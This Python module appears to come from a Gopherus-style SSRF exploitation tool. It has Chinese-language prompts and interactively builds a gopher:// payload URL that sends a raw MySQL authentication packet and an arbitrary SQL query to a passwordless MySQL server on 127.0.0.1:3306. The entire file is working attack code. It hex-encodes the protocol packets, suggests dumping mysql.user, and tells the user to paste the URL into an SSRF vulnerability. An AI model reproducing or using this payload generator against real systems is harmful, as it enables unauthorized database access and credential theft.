from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def MySQL():
    print_banner("MySQL SSRF 利用")

    print_step(1, "配置认证信息")
    print_warning("注意: 目标 MySQL 用户必须没有设置密码才能利用!")
    print_info("输入 MySQL 用户名")
    user = input(c("  > MySQL 用户名 (默认 root): ", CYAN))
    if not user:
        user = "root"
        print_info(f"使用默认值: {user}")

    encode_user = user.encode("utf-8").hex()
    user_length = len(user)
    temp = user_length - 4
    length = (0xA3 + temp).to_bytes(1, "big").hex()

    dump = f"{length}00000185a6ff0100000001210000000000000000000000000000000000000000000000{encode_user}"
    dump += "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"
    dump += "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"
    dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c"

    print_step(2, "配置 SQL 查询")
    print_info("输入要执行的 SQL 查询语句")
    print_warning("示例: SELECT version(), SHOW databases, SELECT * FROM mysql.user")
    query = input(c("  > SQL 查询 (直接回车仅认证): ", CYAN))

    auth = dump.replace("\n", "")

    def encode(s):
        a = [s[i : i + 2] for i in range(0, len(s), 2)]
        return "gopher://127.0.0.1:3306/_%" + "%".join(a)

    def get_payload(query):
        if query.strip() != "":
            query_length = (len(query) + 1).to_bytes(3, "little").hex()
            query_encoded = query.encode("utf-8").hex()
            pay1 = f"{query_length}0003{query_encoded}"
            final = encode(auth + pay1 + "0100000001")
            return final
        else:
            return encode(auth)

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(get_payload(query), UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"将执行查询: {query}" if query.strip() else "仅执行认证，无 SQL 查询")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
